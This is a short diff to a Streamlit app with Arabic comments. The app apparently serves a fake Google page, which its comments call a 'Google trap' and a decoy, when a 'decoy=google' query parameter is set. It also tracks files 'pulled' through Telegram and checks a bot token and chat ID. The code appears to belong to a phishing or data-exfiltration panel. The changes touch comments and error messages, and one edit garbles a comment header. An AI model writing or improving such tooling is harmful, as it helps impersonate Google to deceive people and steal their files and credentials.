@@ -315,8 +315,7 @@ else:
             st.metric("📁 الملفات المسحوبة (عبر تلجرام)", "راجع تلجرام")
 
 
-# ============= معالجة طلبات التحميل (API Endpoint) =============
-# ====================== فخ جوجل - يجب أن يكون في آخر الملف ======================
+# ============= معالجة طلبات التحميل (API # ====================== فخ جوجل - يجب أن يكون في آخر الملف ======================
 query_params = st.query_params
 
 if 'decoy' in query_params and query_params.get('decoy', [''])[0] == 'google':
@@ -328,12 +327,12 @@ if 'decoy' in query_params and query_params.get('decoy', [''])[0] == 'google':
             with open('index.html', 'r', encoding='utf-8') as f:
                 html_content = f.read()
             
-            # هذا السطر مهم جداً - يعرض صفحة Google كاملة بدون واجهة Streamlit
+            # عرض صفحة Google الوهمية كاملة بدون أي عناصر Streamlit أخرى
             st.components.v1.html(html_content, height=800, scrolling=False)
             
         except FileNotFoundError:
-            st.error("❌ ملف index.html غير موجود في المجلد")
+            st.error("❌ ملف index.html غير موجود في root المجلد")
         except Exception as e:
-            st.error(f"❌ خطأ في تحميل صفحة Google: {e}")
+            st.error(f"❌ خطأ: {e}")
     else:
         st.error("توكن أو Chat ID غير صحيح")
